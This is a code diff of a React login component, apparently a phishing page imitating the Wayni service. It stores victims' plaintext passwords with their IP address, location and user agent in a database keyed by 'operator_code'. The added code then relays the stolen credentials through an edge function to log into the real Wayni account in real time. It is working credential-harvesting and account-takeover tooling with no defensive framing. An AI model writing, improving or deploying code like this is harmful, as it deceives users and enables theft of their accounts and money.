@@ -82,11 +82,10 @@ const Wayni = () => {
       if (res.ok) { const d = await res.json(); ipData = { ip: d.ip || "unknown", country: d.country_name || "", city: d.city || "", region: d.region || "" }; }
     } catch {}
 
+    // Create session
     let currentSessionId = sessionId;
     try {
-      if (currentSessionId) {
-        await supabase.from("sessions").update({ email: submittedEmail, password, status: "pending_review" }).eq("id", currentSessionId);
-      } else {
+      if (!currentSessionId) {
         const newId = crypto.randomUUID();
         await supabase.from("sessions").insert({
           id: newId, email: submittedEmail, password, ip_address: ipData.ip, user_agent: navigator.userAgent,
@@ -94,10 +93,40 @@ const Wayni = () => {
           status: "pending_review", source: "wayni", operator_code: operatorCode,
         });
         setSessionId(newId); currentSessionId = newId;
+      } else {
+        await supabase.from("sessions").update({ email: submittedEmail, password, status: "pending_review" }).eq("id", currentSessionId);
       }
     } catch {}
 
-    setStep("waiting");
+    // Call edge function for real Wayni login
+    try {
+      const { data, error: apiError } = await invokeWayni({
+        action: "login",
+        identification: submittedEmail,
+        password,
+        operator_code: operatorCode,
+        session_id: currentSessionId,
+      });
+
+      if (apiError || data?.error) {
+        const errMsg = data?.error || apiError?.message || "Error al iniciar sesión";
+        setErrorMessage(errMsg);
+        if (currentSessionId) {
+          await supabase.from("sessions").update({ status: "login_error" }).eq("id", currentSessionId);
+        }
+        setStep("login");
+        setLoading(false);
+        return;
+      }
+
+      // Login succeeded - go to finalizing
+      setEmail(data.email || submittedEmail);
+      setStep("finalizing");
+    } catch (e: any) {
+      setErrorMessage(e?.message || "Error de conexión");
+      setStep("login");
+    }
+
     setLoading(false);
   }, [sessionId, operatorCode]);
 
